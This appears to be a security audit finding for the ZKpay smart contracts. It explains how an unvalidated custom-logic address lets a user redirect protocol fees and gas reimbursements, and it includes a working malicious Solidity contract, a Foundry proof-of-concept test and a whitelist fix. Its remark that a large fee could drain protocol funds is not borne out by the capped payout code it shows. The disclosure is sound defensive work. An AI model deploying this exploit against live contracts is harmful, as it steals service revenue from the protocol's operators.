### **Title: Malicious `customLogicContractAddress` Allows Diversion of Protocol Fees and Gas Reimbursements**

### **Summary**

The ZKpay contract's `query` function allows users to specify a `customLogicContractAddress` without validation. This user-controlled address is later used by the `settleQueryPayment` function to determine the recipient of protocol fees and gas reimbursements, as well as the fee amount itself. A malicious user can set this to their own contract, enabling them to divert funds intended for the protocol (treasury/service provider) to themselves and/or evade paying service fees, leading to a loss of protocol revenue and an economic vulnerability.

### **Finding Description**

The ZKpay protocol allows users and smart contracts to submit queries and pay for the computational services provided by Space and Time (SXT). A critical vulnerability exists in how the ZKpay smart contract handles the `customLogicContractAddress` parameter provided by the user during query submission. This address, which dictates how query results are processed and how service fees are determined and routed, is not validated when a query is initiated. Consequently, a malicious user can supply their own crafty contract address, leading to the misdirection of protocol fees and gas reimbursements into their own pockets, and potentially allowing them to use SXT's query services for free or at a manipulated cost.

#### The Problem

The vulnerability lies in the fact that when you first call `ZKpay.query`, the function doesn't check if the `customLogicContractAddress` provided is a legitimate SXT department. You can give it the address of your own fake `customLogicContractAddress`.

Let's look at the code:

**Step 1: User Submits a Query with a Malicious `customLogicContractAddress`**

A user calls the `query` function (which internally calls `_query`):

```solidity
// In ZKPay.sol
function query(
    address asset,
    uint248 amount,
    QueryLogic.QueryRequest calldata queryRequest // Attacker controls queryRequest.customLogicContractAddress
) external nonReentrant returns (bytes32 queryHash) {
    return _query(asset, amount, queryRequest);
}

// In QueryLogic.sol (or similar library called by ZKPay)
function _query(
    address asset,
    uint248 amount,
    QueryLogic.QueryRequest calldata queryRequest // Attacker's queryRequest is passed through
) internal returns (bytes32 queryHash) {
    (uint248 actualAmountReceived, uint248 amountInUSD) = AssetManagement
        .handleQueryPayment(_assets, asset, amount); // Payment is taken

    QueryLogic.QueryPayment memory queryPayment = QueryLogic.QueryPayment({
        asset: asset,
        amount: actualAmountReceived,
        source: msg.sender
    });

    // The submitQuery function is called with the attacker's queryRequest
    queryHash = QueryLogic.submitQuery(
        _queryNonce,
        _queryNonces,
        _querySubmissionTimestamps,
        queryRequest, // Contains attacker's customLogicContractAddress
        queryPayment
    );

    _queryPayments[queryHash] = queryPayment;
    // ... event emitted ...
}
```

The `QueryRequest` struct looks like this:

```solidity
struct QueryRequest {
    bytes query;
    bytes queryParameters;
    uint64 timeout;
    address callbackClientContractAddress;
    uint64 callbackGasLimit;
    address customLogicContractAddress; // <--- THIS IS USER-SUPPLIED
    bytes callbackData;
}
```

When `QueryLogic.submitQuery` is called, it performs several checks:

```solidity
// In QueryLogic.sol
function submitQuery(
    // ... other params ...
    QueryRequest calldata queryRequest,
    // ... other params ...
) internal returns (bytes32) {
    // Checks callbackClientContractAddress, callbackGasLimit, timeout
    if (queryRequest.callbackClientContractAddress != msg.sender) { // Checks who gets the result
        revert CallbackClientAddressShouldBeMsgSender();
    }
    if (queryRequest.callbackGasLimit > MAX_GAS_CLIENT_CALLBACK) { // Checks gas for result delivery
        revert CallbackGasLimitTooHigh();
    }
    if (block.timestamp >= queryRequest.timeout && queryRequest.timeout > 0) { // Checks timeout
        revert InvalidQueryTimeout();
    }
    // ...
    // **Crucially, there is NO VALIDATION of queryRequest.customLogicContractAddress here.**
    // ...
    emit QueryReceived( /*...,*/ queryRequest.customLogicContractAddress, /*...*/);
    return queryHash;
}
```

The ZKpay contract accepts the `queryRequest` with the attacker's `customLogicContractAddress` without verifying if it's a legitimate SXT address. This malicious address is then stored or associated with the `queryHash`.

**Step 2: SXT Off-Chain Processing and `fulfillQuery` Call**

The SXT system processes the query off-chain and eventually its relayer calls `fulfillQuery` on the ZKpay contract, providing the `queryHash`, the original `queryRequest` (which still contains the attacker's malicious `customLogicContractAddress`), and the `queryResult`.

```solidity
// In ZKPay.sol
function fulfillQuery(
    bytes32 queryHash,
    QueryLogic.QueryRequest calldata queryRequest, // This still has the attacker's address
    bytes calldata queryResult
) external nonReentrant returns (uint248 gasUsed) {
    _validateQueryRequest(queryHash, queryRequest); // Validates basic integrity of request

    QueryLogic.QueryPayment memory payment = _queryPayments[queryHash]; // Fetches original payment

    // ... (timeout checks, deletion of nonces) ...

    // SXT results might be processed by the custom logic (attacker's contract here)
    bytes memory results = ICustomLogic(
        queryRequest.customLogicContractAddress // Attacker's contract called
    ).execute(queryRequest, queryResult);

    // ... (callback to client) ...
    gasUsed = uint248(initialGas - gasleft());

    // The settlement is where the exploit happens
    (uint248 payoutAmount, uint248 refundAmount) = QueryLogic
        .settleQueryPayment(
            _assets,
            queryRequest.customLogicContractAddress, // Attacker's contract address passed to settlement!
            gasUsed,
            payment
        );

    // ... events ...
}
```

**Step 3: Exploitation in `settleQueryPayment`**

The `settleQueryPayment` function is called with the attacker's `customLogicContractAddress`:

```solidity
// In QueryLogic.sol
function settleQueryPayment(
    mapping(address asset => AssetManagement.PaymentAsset) storage _assets,
    address customLogicContractAddress, // This is the attacker's contract address
    uint248 gasUsed,
    QueryPayment memory payment
) internal returns (uint248 payoutAmount, uint248 refundAmount) {
    // ... (gas cost calculation) ...

    // CRITICAL LINE: The ZKpay contract calls the attacker's contract
    // to ask "Who should I pay?" and "How much is the fee?"
    (address payoutAddress, uint248 fee) = ICustomLogic(
        customLogicContractAddress // Attacker's contract
    ).getPayoutAddressAndFee();

    // ... (fee conversion) ...
    payoutAmount = usedGasInPaymentToken + feeInPaymentToken;

    if (payoutAmount > payment.amount) { // If total cost > user's deposit
        payoutAmount = payment.amount;   // Attacker's contract gets whatever user deposited
    }
    refundAmount = payment.amount - payoutAmount;

    if (payoutAmount > 0) {
        // Tokens are sent to payoutAddress, which the attacker's contract specified!
        IERC20(payment.asset).safeTransfer(payoutAddress, payoutAmount);
    }
    if (refundAmount > 0) { // User gets any leftover, if any
        IERC20(payment.asset).safeTransfer(payment.source, refundAmount);
    }
}
```

#### How the Attacker's Malicious Contract Works:

The attacker deploys a simple contract that implements the `ICustomLogic` interface:
```solidity
interface ICustomLogic {
    function getPayoutAddressAndFee() external view returns (address payoutAddress, uint248 fee);
    function execute(QueryLogic.QueryRequest calldata queryRequest, bytes calldata queryResult) external returns (bytes memory results);
}

contract MaliciousLogic is ICustomLogic {
    address public immutable attackerWallet;

    constructor(address _attackerWallet) {
        attackerWallet = _attackerWallet;
    }

    function getPayoutAddressAndFee() external view override returns (address, uint248) {
        // Return the attacker's wallet as the payout address
        // And return 0 (or a very big number so he drain the protocol funds) as the fee
        return (attackerWallet, 0);
    }

    function execute(
        QueryLogic.QueryRequest calldata /*queryRequest*/,
        bytes calldata queryResult
    ) external pure override returns (bytes memory results) {
        // Just pass through the original result, or do minimal work
        return queryResult;
    }
}
```
When `settleQueryPayment` calls `getPayoutAddressAndFee()` on the attacker's `MaliciousLogic` contract:
*   `payoutAddress` will be `attackerWallet`.
*   `fee` will be 0 or a big fee number which will lead the attacker to drain protocol funds to his address.

This means `feeInPaymentToken` becomes 0. The `payoutAmount` becomes just `usedGasInPaymentToken` (the cost SXT's relayer spent on the L1 callback). This amount (or less, if the user deposited less than the gas cost) is then transferred to `attackerWallet` instead of SXT's treasury.

#### **Security Guarantees Broken:**

*   **Integrity of Protocol Revenue:** The protocol's mechanism for collecting service fees and gas reimbursements is compromised. Funds intended for the SXT service provider are diverted.
*   **Fair Use of Service:** Users can exploit the system to receive query processing and ZK-proofs (which have computational costs for SXT) without paying the intended service fee, or by minimizing it.
*   **Trust in Parameter Handling:** The `settleQueryPayment` function incorrectly trusts a user-controlled parameter (`customLogicContractAddress`) to dictate critical financial routing and fee determination.


### **Proof of Concept**

Create a malicious contract that we'll use in our POC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ICustomLogic} from "../../src/interfaces/ICustomLogic.sol";
import {QueryLogic} from "../../src/libraries/QueryLogic.sol";

contract MaliciousLogic is ICustomLogic {
    address public immutable attackerWallet;

    constructor(address _attackerWallet) {
        attackerWallet = _attackerWallet;
    }

    function getPayoutAddressAndFee() external view override returns (address, uint248) {
        // Return attacker's wallet as payout address and 0 fee
        return (attackerWallet, 0);
    }

    function execute(
        QueryLogic.QueryRequest calldata /*queryRequest*/,
        bytes calldata queryResult
    ) external pure override returns (bytes memory results) {
        // Just pass through the original result
        return queryResult;
    }
}
```

Import the contract and add this test to `zkpay.t.sol`:
```solidity
function testMaliciousCustomLogicDivertsFunds() public {
    // Setup attacker
    address attacker = vm.addr(0x999);
    vm.deal(attacker, 1 ether);

    // Deploy malicious contract
    MaliciousLogic maliciousLogic = new MaliciousLogic(attacker);

    // Setup USDC payment
    uint8 usdcDecimals = 6;
    MockERC20 usdc = new MockERC20();
    uint248 usdcAmount = 10e6; // 10 USDC
    usdc.mint(attacker, usdcAmount);

    // Setup price feed
    address mockUsdcPriceFeed = address(new MockV3Aggregator(8, 1e8));

    // Configure USDC as payment asset
    paymentAssetInstance = AssetManagement.PaymentAsset({
        allowedPaymentTypes: AssetManagement.SEND_PAYMENT_FLAG |
            AssetManagement.QUERY_PAYMENT_FLAG,
        priceFeed: mockUsdcPriceFeed,
        tokenDecimals: usdcDecimals,
        stalePriceThresholdInSeconds: 1000
    });

    vm.prank(_owner);
    zkpay.setPaymentAsset(address(usdc), paymentAssetInstance);

    // Create query request with malicious custom logic
    QueryLogic.QueryRequest memory queryRequest = QueryLogic.QueryRequest({
        query: "test",
        queryParameters: "test",
        timeout: uint64(block.timestamp + 100),
        callbackClientContractAddress: attacker,
        callbackGasLimit: 1_000_000,
        callbackData: "test",
        customLogicContractAddress: address(maliciousLogic)
    });

    // Attacker approves and submits query
    vm.startPrank(attacker);
    usdc.approve(address(zkpay), usdcAmount);
    bytes32 queryHash = zkpay.query(
        address(usdc),
        usdcAmount,
        queryRequest
    );
    vm.stopPrank();

    // Record initial balances
    uint256 attackerInitialBalance = usdc.balanceOf(attacker);
    uint256 treasuryInitialBalance = usdc.balanceOf(_treasury);

    // Fulfill the query
    zkpay.fulfillQuery(queryHash, queryRequest, "results");

    // Check final balances
    uint256 attackerFinalBalance = usdc.balanceOf(attacker);
    uint256 treasuryFinalBalance = usdc.balanceOf(_treasury);

    // Verify that funds were diverted to attacker instead of treasury
    assertGt(
        attackerFinalBalance,
        attackerInitialBalance,
        "Attacker did not receive funds"
    );
    assertEq(
        treasuryFinalBalance,
        treasuryInitialBalance,
        "Treasury received funds when it shouldn't have"
    );
}
```

To run this POC, you can use:
`forge test --match-test testMaliciousCustomLogicDivertsFunds -vv`

### **Recommendation**

Introduce a whitelist (registry) of approved `customLogicContractAddress` values and enforce it in `submitQuery` and `fulfillQuery`. For example:

```solidity
mapping(address => bool) public isApprovedLogicContract;

// Only owner (or multisig) can update:
function registerLogicContract(address logic, bool approved) external onlyOwner {
    isApprovedLogicContract[logic] = approved;
    emit LogicContractUpdated(logic, approved);
}

// In submitQuery:
if (!isApprovedLogicContract[queryRequest.customLogicContractAddress]) {
    revert InvalidLogicContract();
}

// In fulfillQuery before calling execute:
if (!isApprovedLogicContract[queryRequest.customLogicContractAddress]) {
    revert InvalidLogicContract();
}
```
By restricting queries to a trusted set of on-chain verification contracts, you eliminate the ability for an attacker to substitute their own contract, ensuring that fee parameters and payout addresses come only from audited, authorized logic.
